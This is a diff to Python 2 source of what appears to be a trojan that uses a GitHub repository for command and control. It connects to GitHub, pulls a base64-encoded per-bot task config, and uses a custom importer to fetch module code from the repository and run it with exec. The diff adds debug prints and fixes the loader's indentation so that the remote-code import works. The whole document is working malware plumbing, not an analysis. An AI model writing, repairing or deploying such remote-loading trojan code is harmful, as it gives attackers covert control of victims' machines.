@@ -25,13 +25,10 @@ def connect_to_github():
 	return gh,repo,branch
 
 def get_file_contents(filepath):
-#	print "in get_file_contents"
+	print "in get_file_contents"
 	gh, repo, branch = connect_to_github()
-#	print "gh, repo, branch = %s %s %s" % (gh, repo, branch)
+	print "gh, repo, branch = %s %s %s" % (gh, repo, branch)
 	tree = branch.commit.commit.tree.recurse()
-	print "#$#$#$%%"
-	print tree
-	print "#$#$#$%%"
 
 	for filename in tree.tree:
 		if filepath in filename.path:
@@ -45,9 +42,10 @@ def get_bot_config():
 	global configured
 	print bot_config #loads config for specific bot,
 	config_json	= get_file_contents(bot_config)
-	print "after get_file_contents(bot_config)"
-	print "config_json = %s " % config_json
+	print "get_bot_config:: after get_file_contents(bot_config)"
+	print "get_bot_config:: config_json = %s " % config_json
 	config		= json.loads(base64.b64decode(config_json))
+	print "get_bot_config:: config = %s " % config
 	configured	= True
 	for task in config:
 		if task['module'] not in sys.modules:
@@ -76,15 +74,15 @@ class GitImporter(object):
 
 		return None
 
-def load_module(self, name):	# loads athe modules (duh)
-	module = imp.new_module(name)# imp is a native module for creating a blank 1
-	## vv current_module_code is from the find_module function where the module
-	## gets loaded in:: So the above creates a new blank modules and the below
-	## puts the code in from find_module
+	def load_module(self, name):	# loads athe modules (duh)
+		module = imp.new_module(name)# imp is a native module for creating a blank 1
+		## vv current_module_code is from the find_module function where the module
+		## gets loaded in:: So the above creates a new blank modules and the below
+		## puts the code in from find_module
 
-	exec self.current_module_code in module.__dict__
-	sys.modules[name] = module # imports module into sys.modules list
-	return module 
+		exec self.current_module_code in module.__dict__
+		sys.modules[name] = module # imports module into sys.modules list
+		return module 
 
 def module_runner(module):
 	task_queue.put(1)
